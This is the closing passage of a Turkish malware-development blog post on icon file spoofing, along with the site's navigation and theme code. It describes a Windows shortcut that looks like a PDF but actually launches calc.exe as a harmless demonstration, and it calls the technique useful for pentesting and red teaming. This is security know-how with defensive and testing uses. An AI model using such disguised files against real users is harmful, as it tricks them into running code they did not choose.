+<p>Kısayolumuz aslında pdf gibi gözükse de özelliklerine göz attığımızda aslında farklı bir program çalıştıracaktır:</p>
+<p><img src="../../images/posts/file-spoofing/img2.png" alt=""></p>
+<p>Özelliklerine göz attığımızda ise aslında bu kısayolun <strong>calc.exe</strong> programını çalıştırdığını görmekteyiz.</p>
+<h2 id="sonuç">
+<a class="header-anchor" href="#sonu%c3%a7"></a>
+Sonuç
+</h2><p>Bu konumda, icon file spoofing tekniğini ele aldık. Unutmayın ki bu teknik, Pentest ve Red Team çalışmalarında da kullanılışlı olabilir.</p>
+<p>Umarım faydalı olmuştur, teşekkürler! 🚀</p>
+<h2 id="references">
+<a class="header-anchor" href="#references"></a>
+References
+</h2><ul>
+<li><a href="https://medium.com/@s12deff/pdf-icon-file-spoofing-dbfd76476b82">S12 H4CK - PDF Icon File Spoofing</a></li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+      <ul class="article-tag-list" itemprop="keywords">
+  
+    <li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/malware-dev"
+        rel="tag"
+        >MALWARE-DEV</a
+      >
+    </li>
+  
+    <li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/maldev-technique"
+        rel="tag"
+        >MALDEV-TECHNIQUE</a
+      >
+    </li>
+  
+    <li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/icon"
+        rel="tag"
+        >ICON</a
+      >
+    </li>
+  
+    <li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/spoofing"
+        rel="tag"
+        >SPOOFING</a
+      >
+    </li>
+  
+</ul>
+
+    </footer>
+  </div>
+  
+    
+  <nav
+    id="article-nav"
+    data-aos="fade-up"
+  >
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img
+              data-src="images/blog-images/malware-dev.png"
+              data-sizes="auto"
+              alt="API Hashing"
+              class="lazyload"
+            />
+          
+        
+        <a href="https://0xbekoo.github.io/post/api-hashing/"></a>
+        <div class="article-nav-caption">Newer</div>
+        <h3 class="article-nav-title">
+          
+            API Hashing
+          
+        </h3>
+      </div>
+    
+
+    
+      <div class="article-nav-link-wrap article-nav-link-right">
+        
+          
+          
+            <img
+              data-src="images/blog-images/malware-dev.png"
+              data-sizes="auto"
+              alt="I/O Request Packets (IRP)"
+              class="lazyload"
+            />
+          
+        
+        <a href="https://0xbekoo.github.io/post/wkd-irp/"></a>
+        <div class="article-nav-caption">Older</div>
+        <h3 class="article-nav-title">
+          
+            I/O Request Packets (IRP)
+          
+        </h3>
+      </div>
+    
+  </nav>
+
+
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+</section>
+          
+        </main>
+        
+
+
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+
+
+<footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+      2024 -
+      2024
+      <span class="footer-info-sep"></span>
+      0xbekoo
+    </div>
+    
+      <div>
+        Powered by&nbsp;<a
+          href="https://gohugo.io/"
+          target="_blank"
+          >Hugo</a
+        >&nbsp; Theme.<a
+          href="https://github.com/D-Sketon/hugo-theme-reimu"
+          target="_blank"
+          >Reimu</a
+        >
+      </div>
+    
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv"
+          >Number of visits&nbsp;<span
+            id="busuanzi_value_site_pv"
+          ></span
+        ></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv"
+          >Number of visitors&nbsp;<span
+            id="busuanzi_value_site_uv"
+          ></span
+        ></span>
+      </div>
+    
+  </div>
+</footer>
+
+        <div class="sidebar-top">
+          <img
+            src="/images/malware.png"
+            height="50"
+            width="50"
+            alt="backtop"
+          />
+          <div class="arrow-up"></div>
+        </div>
+        <div id="mask"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar">
+        <div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#code">Code</a></li>
+    <li><a href="#programı-çalıştırma">Programı Çalıştırma</a></li>
+    <li><a href="#sonuç">Sonuç</a></li>
+    <li><a href="#references">References</a></li>
+  </ul>
+</nav>
+  </div>
+</div>
+      </div>
+      <div class="sidebar-common-sidebar hidden">
+        
+<div class="sidebar-author">
+  <img
+    data-src="/avatar/../avatar/avatar.png"
+    data-sizes="auto"
+    alt="0xbekoo"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">0xbekoo</div>
+  <div class="sidebar-description">Reverse Engineer, Malware Developer</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div>
+    <div class="sidebar-state-number">
+      9
+    </div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Categories</div>
+    <div class="sidebar-state-number">
+      4
+    </div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tags</div>
+    <div class="sidebar-state-number">33</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+    <div class="icon-github sidebar-social-icon">
+      <a
+        href="https://github.com/0xbekoo"
+        itemprop="url"
+        target="_blank"
+        aria-label="github"
+        rel="noopener external nofollow noreferrer"
+      ></a>
+    </div>
+  
+    <div class="icon-linkedin sidebar-social-icon">
+      <a
+        href="https://www.linkedin.com/in/berkayykarakocc"
+        itemprop="url"
+        target="_blank"
+        aria-label="linkedin"
+        rel="noopener external nofollow noreferrer"
+      ></a>
+    </div>
+  
+    <div class="icon-twitter sidebar-social-icon">
+      <a
+        href="https://twitter.com/0xbekooo"
+        itemprop="url"
+        target="_blank"
+        aria-label="twitter"
+        rel="noopener external nofollow noreferrer"
+      ></a>
+    </div>
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="Home"
+      ></a>
+      <div class="sidebar-menu-icon"></div>
+      <div class="sidebar-menu-link">Home</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="About"
+      ></a>
+      <div class="sidebar-menu-icon"></div>
+      <div class="sidebar-menu-link">About</div>
+    </div>
+  
+</div>
+
+      </div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  
+  <script
+    src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"
+    
+    
+    
+    
+    integrity="sha384-3gT/vsepWkfz/ff7PpWNUeMzeWoH3cDhm/A8jM7ouoAK0/fP/9bcHHR5kHq2nf&#43;e" crossorigin="anonymous"
+  ></script>
+
+
+
+
+  
+  
+  
+  
+  
+  
+  <script
+    src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"
+    
+    
+    
+    
+    integrity="sha384-J08i8An/QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"
+  ></script>
+
+
+
+
+
+
+
+
+
+  
+      
+      <script src="/js/main.js" integrity="" crossorigin="anonymous" ></script>
+      
+
+
+
+  
+
+
+
+
+
+  
+      
+      <script src="/js/aos.js" integrity="" crossorigin="anonymous" ></script>
+      
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === "loading") {
+      document.addEventListener("DOMContentLoaded", aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+
+
+
+
+
+  
+      
+      <script src="/js/pjax_main.js" integrity="" crossorigin="anonymous" data-pjax></script>
+      
+
+
+
+
+
+  
+
+  
+  
+  
+  
+  
+  
+  <script
+    src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js"
+    
+    
+    
+    
+    integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL/hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"
+  ></script>
+
+
+<script>
+  if (window.firework) {
+    const options = JSON.parse("{\"excludeelements\":[\"a\",\"button\"],\"particles\":[{\"colors\":[\"#ff5252\",\"#ff7c7c\",\"#ffafaf\",\"#ffd0d0\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"emit\"],\"number\":20,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.3,0.5],\"radius\":[16,32]}},{\"colors\":[\"#ff0000\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"diffuse\"],\"number\":1,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.2,0.5],\"lineWidth\":6,\"radius\":20}}]}");
+    options.excludeElements = options.excludeelements;
+    delete options.excludeelements;
+    window.firework(options);
+  }
+</script>
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+    
+      
+
+
+
+
+
+  
+      
+      <script src="/js/insert_highlight.js" integrity="" crossorigin="anonymous" data-pjax></script>
+      
+
+      
+      
+      
+      
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js", "sha384-DiL6M\/gG\u002bwmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF\/N6lrZi\/")).default;
+
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+
+
+
+
+    
+    
+  </div>
+</div>
+
+
+
+
+  
+
+  
+  
+  
+  
+  
+  
+  <script
+    src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js"
+    
+    async
+    
+    
+    integrity="sha384-0M75wtSkhjIInv4coYlaJU83&#43;OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id&#43;S" crossorigin="anonymous"
+  ></script>
+
+
+
+
+
+  <script>
+    if ('serviceWorker' in navigator) {
+      navigator.serviceWorker.getRegistrations().then((registrations) => {
+        for (let registration of registrations) {
+          registration.unregister();
+        }
+      });
+    }
+  </script>
+
+
+<script>
+  const reimuCopyright = String.raw`
+   ______     ______     __     __    __     __  __    
+  /\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+  \ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+   \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+    \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                    
+  `;
+  console.log(String.raw`%c ${reimuCopyright}`, "color: #ff5252;");
+  console.log(
+    "%c Theme.Reimu" + " %c https://github.com/D-Sketon/hugo-theme-reimu ",
+    "color: white; background: #ff5252; padding:5px 0;",
+    "padding:4px;border:1px solid #ff5252;",
+  );
+</script>
+
+  </body>
+</html>
